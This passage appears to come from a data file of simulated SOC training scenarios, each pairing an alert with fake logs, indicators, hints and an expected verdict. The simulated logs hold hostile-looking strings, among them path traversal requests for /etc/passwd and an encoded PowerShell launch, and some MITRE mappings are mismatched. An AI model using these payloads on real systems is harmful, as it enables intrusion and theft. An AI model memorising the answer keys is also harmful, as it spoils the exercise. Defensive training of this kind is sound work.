        {"ioc_type": "email", "value": "corp_report@aol.com", "description": "AgentTesla SMTP sender account", "malicious": 1},
        {"ioc_type": "email", "value": "attacker_recv@protonmail.com", "description": "Threat actor data collection email", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 10:00:00", "event_type": "Malware Active", "description": "AgentTesla keylogger detected actively running", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 10:05:00", "event_type": "Exfiltration", "description": "Stolen credentials sent via SMTP to attacker email", "source": "Firewall", "severity": "critical"},
    ]
},

# Additional scenarios to reach 50+
{
    "title": "SSH Brute Force - Linux Server",
    "category": "Authentication Attacks",
    "severity": "high",
    "description": "SSH brute force attack against production Linux web server. 5,000 attempts in 20 minutes from multiple IPs. One successful login with weak password 'summer2024'.",
    "source": "Linux Auth Log / Fail2ban",
    "source_ip": "45.155.205.100",
    "dest_ip": "10.20.5.50",
    "hostname": "PROD-WEB01",
    "username": "deploy",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Check /var/log/auth.log for sshd failed password entries. Successful login after mass failures indicates compromise.",
    "solution_explanation": "True positive SSH brute force with successful compromise. 'deploy' account with weak password compromised. Immediate action: rotate credentials, check for post-exploitation activity, add IP to blocklist.",
    "host_info": json.dumps({"hostname": "PROD-WEB01", "os": "Ubuntu 22.04", "ip": "10.20.5.50", "exposed_ports": ["22/SSH"], "fail2ban": "Enabled but bypassed via IP rotation", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "deploy", "password_strength": "Weak (summer2024)", "sudo_access": True, "note": "Deployment service account with elevated privileges"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1110.001", "name": "Brute Force: Password Guessing", "url": "https://attack.mitre.org/techniques/T1110/001/"}),
    "logs": [
        {"log_type": "linux_syslog", "timestamp": "2024-12-15 04:00:00", "source_ip": "45.155.205.100", "dest_ip": "10.20.5.50", "username": "root", "event_id": "sshd", "raw_log": "Dec 15 04:00:00 PROD-WEB01 sshd[1234]: Failed password for invalid user admin from 45.155.205.100 port 54321 ssh2", "highlighted": 0},
        {"log_type": "linux_syslog", "timestamp": "2024-12-15 04:15:00", "source_ip": "45.155.205.101", "dest_ip": "10.20.5.50", "username": "deploy", "event_id": "sshd", "raw_log": "Dec 15 04:15:00 PROD-WEB01 sshd[5678]: Failed password for deploy from 45.155.205.101 port 44444 ssh2 | Attempt 247 on this account", "highlighted": 0},
        {"log_type": "linux_syslog", "timestamp": "2024-12-15 04:20:00", "source_ip": "45.155.205.102", "dest_ip": "10.20.5.50", "username": "deploy", "event_id": "sshd", "raw_log": "Dec 15 04:20:00 PROD-WEB01 sshd[9012]: Accepted password for deploy from 45.155.205.102 port 33333 ssh2 | PAM: Session opened | SUCCESSFUL LOGIN AFTER 5000 FAILURES", "highlighted": 1},
        {"log_type": "linux_syslog", "timestamp": "2024-12-15 04:20:10", "source_ip": "45.155.205.102", "dest_ip": "10.20.5.50", "username": "deploy", "event_id": "sudo", "raw_log": "Dec 15 04:20:10 PROD-WEB01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash | PRIVILEGE ESCALATION TO ROOT", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "45.155.205.100", "description": "SSH brute force source IP (1 of multiple)", "malicious": 1},
        {"ioc_type": "ip", "value": "45.155.205.102", "description": "IP used for successful compromise", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 04:00:00", "event_type": "Attack Start", "description": "SSH brute force begins from multiple IPs", "source": "auth.log", "severity": "medium"},
        {"event_time": "2024-12-15 04:20:00", "event_type": "Compromise", "description": "deploy account compromised with password summer2024", "source": "auth.log", "severity": "critical"},
        {"event_time": "2024-12-15 04:20:10", "event_type": "Privilege Escalation", "description": "Attacker escalates to root via sudo", "source": "auth.log", "severity": "critical"},
    ]
},

{
    "title": "Suspicious Outbound Traffic - Beaconing to Pastebin",
    "category": "Network Security",
    "severity": "medium",
    "description": "Workstation making regular HTTP GET requests to pastebin.com/raw URLs every 5 minutes. Consistent timing suggests automated C2 check-in via dead drop resolver technique.",
    "source": "Proxy / Web Filter",
    "source_ip": "10.10.3.77",
    "dest_ip": "104.20.68.54",
    "hostname": "WKSTN-MKTG05",
    "username": "w.harris",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Regular interval requests to paste sites are dead drop C2. The malware checks the paste for new commands. Look at request frequency and the paste content.",
    "solution_explanation": "True positive C2 via dead drop resolver. Malware polls pastebin every 5 minutes for encrypted commands. Block pastebin on corporate proxy and investigate the host for malware.",
    "host_info": json.dumps({"hostname": "WKSTN-MKTG05", "os": "Windows 10", "ip": "10.10.3.77", "criticality": "Low"}),
    "user_info": json.dumps({"username": "w.harris", "department": "Marketing", "note": "User unaware of infection"}),
    "mitre_mapping": json.dumps({"tactic": "Command and Control", "technique": "T1102.001", "name": "Web Service: Dead Drop Resolver", "url": "https://attack.mitre.org/techniques/T1102/001/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 08:00:00", "source_ip": "10.10.3.77", "dest_ip": "104.20.68.54", "username": "w.harris", "event_id": "200", "raw_log": "PROXY | GET https://pastebin.com/raw/xKj8mN2p | User-Agent: Mozilla/5.0 (automated) | Interval: EVERY 5 MINUTES | 10.10.3.77 | w.harris", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 08:05:00", "source_ip": "10.10.3.77", "dest_ip": "104.20.68.54", "username": "w.harris", "event_id": "200", "raw_log": "PROXY | GET https://pastebin.com/raw/xKj8mN2p | Attempt #2 | Exact 5 minute interval | C2 DEAD DROP PATTERN", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 09:00:00", "source_ip": "10.10.3.77", "dest_ip": "104.20.68.54", "username": "w.harris", "event_id": "SUMMARY", "raw_log": "PROXY SUMMARY | Pastebin requests: 12 in 1 hour | All to same raw URL | Exact 5 min interval | Automated C2 beacon pattern | Paste content: Base64 encoded commands", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "url", "value": "https://pastebin.com/raw/xKj8mN2p", "description": "Dead drop C2 resolver URL on Pastebin", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 08:00:00", "event_type": "C2 Beacon", "description": "First pastebin check-in detected", "source": "Proxy", "severity": "medium"},
        {"event_time": "2024-12-15 09:00:00", "event_type": "Pattern Confirmed", "description": "12 requests in 1 hour - exactly 5 minute intervals", "source": "Proxy Analytics", "severity": "high"},
    ]
},

{
    "title": "Cloud Misconfiguration - Publicly Exposed Kubernetes Dashboard",
    "category": "Cloud Security",
    "severity": "critical",
    "description": "Kubernetes dashboard exposed to the internet without authentication. External IP accessed the dashboard and began listing pods and secrets in the production namespace.",
    "source": "AWS WAF / CloudTrail / K8s Audit Log",
    "source_ip": "91.92.250.150",
    "dest_ip": "3.89.214.100",
    "hostname": "K8S-PROD-CLUSTER",
    "username": "anonymous",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "K8s dashboard without authentication on public IP is critical. Check audit logs for what the attacker listed (secrets, configmaps, pods).",
    "solution_explanation": "True positive critical cloud misconfiguration exploitation. Kubernetes dashboard exposed publicly allows full cluster access. Secrets including DB credentials and API keys likely compromised. Rotate all credentials.",
    "host_info": json.dumps({"hostname": "K8S-PROD-CLUSTER", "service": "Kubernetes", "namespace": "production", "exposed_port": "8001/TCP (kubectl proxy)", "public_ip": "3.89.214.100", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "anonymous (no auth)", "accessed_resources": ["pods", "secrets", "configmaps", "deployments"]}),
    "mitre_mapping": json.dumps({"tactic": "Discovery", "technique": "T1613", "name": "Container and Resource Discovery", "url": "https://attack.mitre.org/techniques/T1613/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 07:30:00", "source_ip": "91.92.250.150", "dest_ip": "3.89.214.100", "username": "anonymous", "event_id": "200", "raw_log": "K8S Audit | GET /api/v1/namespaces/production/secrets | User: anonymous | IP: 91.92.250.150 | Status: 200 | Secrets listed: 23 | DB_PASSWORD, API_KEY, JWT_SECRET, AWS_ACCESS_KEY all exposed", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 07:30:05", "source_ip": "91.92.250.150", "dest_ip": "3.89.214.100", "username": "anonymous", "event_id": "200", "raw_log": "K8S Audit | GET /api/v1/namespaces/production/pods | 47 pods listed | Production environment fully enumerated by attacker | Dashboard: No authentication required", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "91.92.250.150", "description": "External IP accessing exposed K8s dashboard", "malicious": 1},
        {"ioc_type": "ip", "value": "3.89.214.100", "description": "Kubernetes cluster public IP - dashboard exposed", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 07:30:00", "event_type": "Unauthorized Access", "description": "External IP accesses K8s dashboard without auth", "source": "K8s Audit Log", "severity": "critical"},
        {"event_time": "2024-12-15 07:30:05", "event_type": "Secret Exposure", "description": "All 23 production secrets listed including DB passwords and API keys", "source": "K8s Audit Log", "severity": "critical"},
    ]
},

{
    "title": "Lateral Movement - WMI Remote Execution",
    "category": "Active Directory",
    "severity": "high",
    "description": "WMI used remotely to execute commands on 8 servers from a single compromised workstation. Classic lateral movement technique using WMIC process call create.",
    "source": "Windows Event Log",
    "source_ip": "10.10.1.110",
    "dest_ip": "10.10.0.0/24",
    "hostname": "Multiple Servers",
    "username": "it_admin",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Remote WMI shows EventID 4688 with parent wmiprvse.exe and WMI provider service as caller. Non-admin workstation doing this is suspicious.",
    "solution_explanation": "True positive WMI lateral movement. Compromised it_admin account used to WMI-exec commands on 8 servers. Attacker spreading across network. Isolate originating host and audit all 8 targets.",
    "host_info": json.dumps({"hostname": "8 servers via WMI", "source": "WKSTN-IT02 (compromised)", "targets": ["FILESERVER01", "SQLSERVER01", "DC01", "5 others"], "criticality": "Critical"}),
    "user_info": json.dumps({"username": "it_admin", "privileges": "Local admin on servers", "anomaly": "it_admin never uses WMI remotely - uses PSRemoting"}),
    "mitre_mapping": json.dumps({"tactic": "Lateral Movement", "technique": "T1021.003", "name": "Remote Services: Distributed Component Object Model", "url": "https://attack.mitre.org/techniques/T1021/003/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 16:00:00", "source_ip": "10.10.1.110", "dest_ip": "10.10.0.10", "username": "it_admin", "event_id": "4688", "raw_log": "EventID: 4688 | FILESERVER01 | New Process: cmd.exe | Parent: WmiPrvSE.exe | CommandLine: cmd.exe /c whoami && ipconfig /all > C:\\Windows\\Temp\\info.txt | Source: 10.10.1.110 | WMI REMOTE EXEC", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 16:00:10", "source_ip": "10.10.1.110", "dest_ip": "10.10.0.5", "username": "it_admin", "event_id": "4688", "raw_log": "EventID: 4688 | DC01 | cmd.exe via WmiPrvSE.exe | net user /domain | DOMAIN RECON ON DC via WMI | Source: 10.10.1.110", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "10.10.1.110", "description": "WKSTN-IT02 - WMI lateral movement source", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 16:00:00", "event_type": "WMI Lateral Move", "description": "WMI remote execution begins from WKSTN-IT02", "source": "Event Log", "severity": "high"},
        {"event_time": "2024-12-15 16:00:10", "event_type": "DC Reached", "description": "WMI execution reaches Domain Controller", "source": "Event Log", "severity": "critical"},
    ]
},

{
    "title": "Web Application - Path Traversal Attack",
    "category": "Web Attacks",
    "severity": "high",
    "description": "Path traversal attack against file download endpoint. Attacker read /etc/passwd, /etc/shadow, and web application configuration files including database credentials.",
    "source": "Nginx / WAF",
    "source_ip": "5.188.210.100",
    "dest_ip": "10.20.5.100",
    "hostname": "WEB-APP01",
    "username": "anonymous",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Path traversal uses ../ sequences to navigate outside web root. Check for /etc/passwd, /etc/shadow, or config files in HTTP responses.",
    "solution_explanation": "True positive path traversal. Attacker read system files and web app config. Database credentials likely compromised. Patch file download endpoint, rotate DB credentials, assess breach scope.",
    "host_info": json.dumps({"hostname": "WEB-APP01", "os": "Ubuntu 22.04", "ip": "10.20.5.100", "web_root": "/var/www/html", "criticality": "High"}),
    "user_info": json.dumps({"username": "anonymous", "files_read": ["/etc/passwd", "/etc/shadow", "/var/www/html/config.php"]}),
    "mitre_mapping": json.dumps({"tactic": "Discovery", "technique": "T1083", "name": "File and Directory Discovery", "url": "https://attack.mitre.org/techniques/T1083/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 15:10:00", "source_ip": "5.188.210.100", "dest_ip": "10.20.5.100", "username": "anonymous", "event_id": "200", "raw_log": '5.188.210.100 - - "GET /download?file=../../../etc/passwd HTTP/1.1" 200 2847 | PATH TRAVERSAL | /etc/passwd RETURNED TO ATTACKER', "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 15:10:05", "source_ip": "5.188.210.100", "dest_ip": "10.20.5.100", "username": "anonymous", "event_id": "200", "raw_log": '5.188.210.100 - - "GET /download?file=../../../var/www/html/config.php HTTP/1.1" 200 512 | DATABASE CONFIG EXPOSED: host=db01, user=webapp, password=Pr0dDB@2024', "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "5.188.210.100", "description": "Path traversal attacker IP", "malicious": 1},
        {"ioc_type": "url", "value": "/download?file=../../../etc/passwd", "description": "Path traversal payload URL", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 15:10:00", "event_type": "File Read", "description": "/etc/passwd successfully read via path traversal", "source": "Nginx", "severity": "critical"},
        {"event_time": "2024-12-15 15:10:05", "event_type": "Config Exposed", "description": "Database config with production credentials read", "source": "Nginx", "severity": "critical"},
    ]
},

{
    "title": "Insider Threat - Unauthorized Database Query",
    "category": "Data Exfiltration",
    "severity": "high",
    "description": "DBA account ran unauthorized SELECT * queries dumping entire customer database tables at 11 PM on a Friday. Queries accessed tables outside their job scope.",
    "source": "Database Audit Log / SIEM",
    "source_ip": "10.10.5.20",
    "dest_ip": "10.10.0.30",
    "hostname": "SQLSERVER01",
    "username": "dba_martinez",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Check if these queries are within the DBA's job scope. Time of day, query scope (SELECT * FROM customer), and volume are all anomalous.",
    "solution_explanation": "True positive insider threat. DBA accessing customer PII tables at 11 PM Friday without change ticket is policy violation and possible data theft. Engage HR, Legal, and IR.",
    "host_info": json.dumps({"hostname": "SQLSERVER01", "os": "Windows Server 2019 / SQL Server 2019", "ip": "10.10.0.30", "databases": ["CustomerDB", "FinanceDB", "HRDB"], "criticality": "Critical"}),
    "user_info": json.dumps({"username": "dba_martinez", "department": "Database Team", "job_scope": "Schema maintenance, performance tuning", "authorized_tables": "System tables only", "change_ticket": "None open for Friday night"}),
    "mitre_mapping": json.dumps({"tactic": "Collection", "technique": "T1213.003", "name": "Data from Information Repositories: Code Repositories", "url": "https://attack.mitre.org/techniques/T1213/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 23:00:00", "source_ip": "10.10.5.20", "dest_ip": "10.10.0.30", "username": "dba_martinez", "event_id": "DATABASE_AUDIT", "raw_log": "SQL Server Audit | SELECT | User: dba_martinez | Query: SELECT * FROM CustomerDB.dbo.Customers | Rows: 450,000 | Duration: 45s | Time: 23:00:00 FRIDAY | OUT OF HOURS | OUT OF SCOPE", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 23:05:00", "source_ip": "10.10.5.20", "dest_ip": "10.10.0.30", "username": "dba_martinez", "event_id": "DATABASE_AUDIT", "raw_log": "SQL Server Audit | SELECT | dba_martinez | SELECT email, ssn, cc_number FROM CustomerDB.dbo.Customers | PII FIELDS | 450K rows | Exported via SQL Server Management Studio to CSV", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "10.10.5.20", "description": "DBA workstation - insider threat origin", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 23:00:00", "event_type": "Unauthorized Query", "description": "DBA queries entire customer table at 11 PM Friday", "source": "DB Audit Log", "severity": "high"},
        {"event_time": "2024-12-15 23:05:00", "event_type": "PII Access", "description": "SSN, CC numbers, emails queried and exported to CSV", "source": "DB Audit Log", "severity": "critical"},
    ]
},

{
    "title": "Malware - Emotet Dropper via Macro",
    "category": "Malware",
    "severity": "critical",
    "description": "Emotet banking trojan dropped via Word document macro. Emotet known to download additional payloads (TrickBot, Qakbot) and enable ransomware deployment.",
    "source": "Microsoft Defender / EDR",
    "source_ip": "10.10.4.33",
    "dest_ip": "185.234.218.16",
    "hostname": "WKSTN-SALES07",
    "username": "p.brown",
    "expected_verdict": "true_positive",
    "points": 225,
    "hint": "Emotet uses Word macros, downloads via PowerShell/certutil, and beacons to multiple C2s. Look for WINWORD.EXE spawning cmd/PowerShell.",
    "solution_explanation": "True positive Emotet infection. Emotet is a loader - it will download TrickBot or Qakbot next, leading to ransomware. Isolate immediately and check for lateral spread via SMB.",
    "host_info": json.dumps({"hostname": "WKSTN-SALES07", "os": "Windows 10", "ip": "10.10.4.33", "criticality": "High", "network_shares": ["\\\\fileserver\\sales"]}),
    "user_info": json.dumps({"username": "p.brown", "department": "Sales", "email_opened": "Invoice_2024_12.doc at 14:30"}),
    "mitre_mapping": json.dumps({"tactic": "Execution", "technique": "T1204.002", "name": "User Execution: Malicious File", "url": "https://attack.mitre.org/techniques/T1204/002/"}),
    "logs": [
        {"log_type": "edr", "timestamp": "2024-12-15 14:31:00", "source_ip": "10.10.4.33", "dest_ip": "", "username": "p.brown", "event_id": "EDR-CRITICAL", "raw_log": "Defender ATP | ALERT | Malware | WINWORD.EXE spawned CMD.EXE | cmd /c powershell -exec bypass -w 1 -enc SUVYI... | Emotet Stage1 | File: Invoice_2024_12.doc | SHA256: ef1234...5678 | FAMILY: Emotet", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 14:31:30", "source_ip": "10.10.4.33", "dest_ip": "185.234.218.16", "username": "", "event_id": "", "raw_log": "FIREWALL | ALLOW | 10.10.4.33 -> 185.234.218.16:8080 | Emotet C2 | Threat Intel: KNOWN EMOTET IOC | HTTP POST /upload | Sending host fingerprint and pending command", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "185.234.218.16", "description": "Known Emotet C2 server", "malicious": 1},
        {"ioc_type": "filename", "value": "Invoice_2024_12.doc", "description": "Emotet dropper document", "malicious": 1},
        {"ioc_type": "hash", "value": "ef12345678901234567890123456789012345678901234567890123456789012", "description": "Emotet payload SHA256", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 14:30:00", "event_type": "Macro Enabled", "description": "User enabled macros in malicious Word document", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 14:31:00", "event_type": "Emotet Drop", "description": "WINWORD.EXE spawns PowerShell - Emotet stage 1 executes", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 14:31:30", "event_type": "C2 Beacon", "description": "Emotet beacons to known C2 - secondary payload expected", "source": "Firewall", "severity": "critical"},
    ]
},

{
    "title": "Network Anomaly - BitTorrent on Corporate Network",
    "category": "Network Security",
    "severity": "low",
    "description": "BitTorrent traffic detected from HR workstation. P2P traffic violates acceptable use policy but no immediate security threat detected.",
    "source": "Palo Alto Firewall App-ID",
    "source_ip": "10.10.4.99",
    "dest_ip": "Various",
    "hostname": "WKSTN-HR07",
    "username": "t.brown",
    "expected_verdict": "false_positive",
    "points": 50,
    "hint": "BitTorrent is a policy violation but not necessarily a security incident. Check what content was downloaded - could be legitimate open-source software.",
    "solution_explanation": "False positive from security perspective. BitTorrent for Ubuntu ISO download is an AUP violation, not a security incident. Route to HR for policy enforcement, not SOC IR.",
    "host_info": json.dumps({"hostname": "WKSTN-HR07", "os": "Windows 10", "ip": "10.10.4.99", "criticality": "Low"}),
    "user_info": json.dumps({"username": "t.brown", "department": "HR", "statement": "Downloading Ubuntu 22.04 ISO for home use"}),
    "mitre_mapping": json.dumps({"tactic": "N/A", "technique": "N/A", "name": "Acceptable Use Policy Violation", "url": ""}),
    "logs": [
        {"log_type": "firewall", "timestamp": "2024-12-15 13:00:00", "source_ip": "10.10.4.99", "dest_ip": "Various", "username": "t.brown", "event_id": "", "raw_log": "PALO ALTO | App-ID: bittorrent | SRC: 10.10.4.99 | Policy: AUP-VIOLATION | Bytes: 2.1GB | Torrent: ubuntu-22.04.3-desktop-amd64.iso | POLICY VIOLATION NOT SECURITY INCIDENT", "highlighted": 0},
    ],
    "iocs": [],
    "timeline": [
        {"event_time": "2024-12-15 13:00:00", "event_type": "P2P Traffic", "description": "BitTorrent detected - Ubuntu ISO download", "source": "Firewall", "severity": "low"},
    ]
},

{
    "title": "Spear Phishing - HR Targeting New Employee",
    "category": "Phishing",
    "severity": "high",
    "description": "New employee targeted by spear phishing email appearing to be from HR requesting they complete onboarding via a link. Link leads to credential harvesting page.",
    "source": "Email Security Gateway",
    "source_ip": "209.85.220.100",
    "dest_ip": "10.10.0.25",
    "hostname": "MAIL-GW01",
    "username": "new.employee",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "New employees are high-value phishing targets. Check the link destination and sender domain carefully.",
    "solution_explanation": "True positive spear phishing targeting new employee. Attacker researched LinkedIn for new hire. Link leads to fake O365 login page. Credential harvest likely successful - reset password immediately.",
    "host_info": json.dumps({"hostname": "MAIL-GW01", "criticality": "Medium"}),
    "user_info": json.dumps({"username": "new.employee", "start_date": "2024-12-15 (today)", "department": "Engineering", "mfa_enrolled": False, "note": "New employee - may not recognize phishing"}),
    "mitre_mapping": json.dumps({"tactic": "Initial Access", "technique": "T1566.002", "name": "Phishing: Spear phishing Link", "url": "https://attack.mitre.org/techniques/T1566/002/"}),
    "logs": [
        {"log_type": "email", "timestamp": "2024-12-15 08:00:00", "source_ip": "209.85.220.100", "dest_ip": "10.10.0.25", "username": "new.employee@corp.com", "event_id": "EMAIL-RECEIVED", "raw_log": "Email Gateway | From: hr-onboarding@corp-hr.net (NOT corp.com) | To: new.employee@corp.com | Subject: Welcome! Complete Your Onboarding | Link: https://corp-onboard.azurewebsites.net/login | DMARC: FAIL | Targeted: New hire research via LinkedIn", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "domain", "value": "corp-hr.net", "description": "Phishing domain impersonating corp HR", "malicious": 1},
        {"ioc_type": "url", "value": "https://corp-onboard.azurewebsites.net/login", "description": "Credential harvesting page on Azure (abuse)", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 08:00:00", "event_type": "Phishing Received", "description": "Spear phishing targeting new employee on first day", "source": "Email Gateway", "severity": "high"},
    ]
},

{
    "title": "DDoS Attack - HTTP Flood",
    "category": "Network Security",
    "severity": "high",
    "description": "HTTP flood DDoS targeting public-facing web application. 2.8 million requests per minute from 15,000 unique IPs (botnet). Application response time degraded from 80ms to 45 seconds.",
    "source": "Cloudflare / WAF",
    "source_ip": "Multiple (botnet)",
    "dest_ip": "10.20.5.100",
    "hostname": "WEB-APP01",
    "username": "",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "DDoS floods show massive request rates from distributed IPs. Check request patterns - HTTP flood often has similar User-Agents or request paths.",
    "solution_explanation": "True positive HTTP flood DDoS. 2.8M req/min from 15K IPs indicates botnet. Enable Cloudflare Under Attack Mode, implement rate limiting, enable JS challenge.",
    "host_info": json.dumps({"hostname": "WEB-APP01", "ip": "10.20.5.100", "response_time_normal": "80ms", "response_time_attack": "45s", "criticality": "High"}),
    "user_info": json.dumps({"username": "N/A", "attack_source": "15,000 IP botnet"}),
    "mitre_mapping": json.dumps({"tactic": "Impact", "technique": "T1499.002", "name": "Endpoint Denial of Service: Service Exhaustion Flood", "url": "https://attack.mitre.org/techniques/T1499/002/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 20:00:00", "source_ip": "Multiple", "dest_ip": "10.20.5.100", "username": "", "event_id": "DDOS", "raw_log": "Cloudflare | DDoS ALERT | Type: HTTP Flood | Requests/min: 2,800,000 | Unique IPs: 15,247 | Top countries: CN(40%), RU(25%), BR(20%) | Target: / (homepage) | Botnet: Mirai variant | Application: DOWN", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "185.220.101.200", "description": "Sample botnet node IP (1 of 15,247)", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 20:00:00", "event_type": "DDoS Start", "description": "HTTP flood begins - 2.8M req/min from 15K IPs", "source": "Cloudflare", "severity": "critical"},
        {"event_time": "2024-12-15 20:05:00", "event_type": "Service Degraded", "description": "Application response time increases to 45 seconds", "source": "APM", "severity": "critical"},
    ]
},

{
    "title": "Threat Hunt - Suspicious Registry Run Key",
    "category": "Threat Hunting",
    "severity": "medium",
    "description": "Proactive hunt found suspicious registry run key pointing to script in %TEMP% folder. Key named to resemble legitimate Windows component. No AV alerts.",
    "source": "osquery / Registry Hunt",
    "source_ip": "10.10.2.55",
    "dest_ip": "",
    "hostname": "WKSTN-ACCT05",
    "username": "t.nguyen",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Registry run keys in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run that point to TEMP folder are persistence indicators.",
    "solution_explanation": "True positive malware persistence via registry run key. Script in TEMP folder runs on login - dropper or backdoor. Remove key, delete script, full malware scan.",
    "host_info": json.dumps({"hostname": "WKSTN-ACCT05", "os": "Windows 10", "ip": "10.10.2.55", "criticality": "High"}),
    "user_info": json.dumps({"username": "t.nguyen", "department": "Accounting"}),
    "mitre_mapping": json.dumps({"tactic": "Persistence", "technique": "T1547.001", "name": "Boot or Logon Autostart Execution: Registry Run Keys", "url": "https://attack.mitre.org/techniques/T1547/001/"}),
    "logs": [
        {"log_type": "edr", "timestamp": "2024-12-15 09:30:00", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "HUNT", "raw_log": "osquery | registry | HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | Name: WindowsHelperService | Data: C:\\Users\\t.nguyen\\AppData\\Local\\Temp\\whs.vbs | Created: 2024-12-13 | AV: No detection | SUSPICIOUS: Run key pointing to TEMP/VBS", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-13 14:22:00", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "4657", "raw_log": "EventID: 4657 | Registry Value Modified | Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | Value: WindowsHelperService | New Data: C:\\Users\\t.nguyen\\AppData\\Local\\Temp\\whs.vbs | Created 2 days ago", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "C:\\Users\\t.nguyen\\AppData\\Local\\Temp\\whs.vbs", "description": "Malicious VBScript in Temp folder", "malicious": 1},
        {"ioc_type": "filename", "value": "WindowsHelperService (registry key)", "description": "Malicious registry run key", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-13 14:22:00", "event_type": "Persistence Set", "description": "Registry run key created pointing to VBScript", "source": "Event Log", "severity": "high"},
        {"event_time": "2024-12-15 09:30:00", "event_type": "Hunt Discovery", "description": "osquery hunt discovers persistence mechanism", "source": "osquery", "severity": "high"},
    ]
},

{
    "title": "Email Security - Malware in Password Protected ZIP",
    "category": "Phishing",
    "severity": "high",
    "description": "Email with password-protected ZIP bypassed email scanning. Password provided in email body. ZIP contains executable file disguised as PDF.",
    "source": "Email Security Gateway",
    "source_ip": "194.165.16.25",
    "dest_ip": "10.10.0.25",
    "hostname": "MAIL-GW01",
    "username": "v.patel",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Password-protected ZIPs defeat email scanning. Look for executable files within ZIPs disguised with double extensions (document.pdf.exe).",
    "solution_explanation": "True positive malware delivery via password-protected ZIP. Classic AV evasion technique. Payload is executable disguised as PDF. Block email, quarantine on endpoint if opened.",
    "host_info": json.dumps({"hostname": "MAIL-GW01", "criticality": "Medium"}),
    "user_info": json.dumps({"username": "v.patel", "department": "Finance", "opened_attachment": "Unknown - check EDR logs"}),
    "mitre_mapping": json.dumps({"tactic": "Defense Evasion", "technique": "T1027", "name": "Obfuscated Files or Information", "url": "https://attack.mitre.org/techniques/T1027/"}),
    "logs": [
        {"log_type": "email", "timestamp": "2024-12-15 11:00:00", "source_ip": "194.165.16.25", "dest_ip": "10.10.0.25", "username": "v.patel@corp.com", "event_id": "EMAIL-DELIVERED", "raw_log": "Email GW | DELIVERED | From: invoices@supplier-co.net | To: v.patel@corp.com | Subject: Invoice Q4-2024 - Password: inv2024 | Attachment: invoice_dec.zip (password protected) | Scan: CANNOT INSPECT (encrypted) | DELIVERED", "highlighted": 1},
        {"log_type": "email", "timestamp": "2024-12-15 11:00:00", "source_ip": "194.165.16.25", "dest_ip": "10.10.0.25", "username": "v.patel@corp.com", "event_id": "EMAIL-ANALYSIS", "raw_log": "Manual Analysis | ZIP Contents: invoice_dec_2024.pdf.exe (double extension) | File type: PE32 executable | Antivirus: DETECTED Trojan.GenericKD | MALWARE CONFIRMED in ZIP contents", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "invoice_dec_2024.pdf.exe", "description": "Malware with double extension in ZIP", "malicious": 1},
        {"ioc_type": "domain", "value": "supplier-co.net", "description": "Malicious email sender domain", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 11:00:00", "event_type": "Email Delivered", "description": "Password-protected ZIP bypasses email AV scanning", "source": "Email Gateway", "severity": "high"},
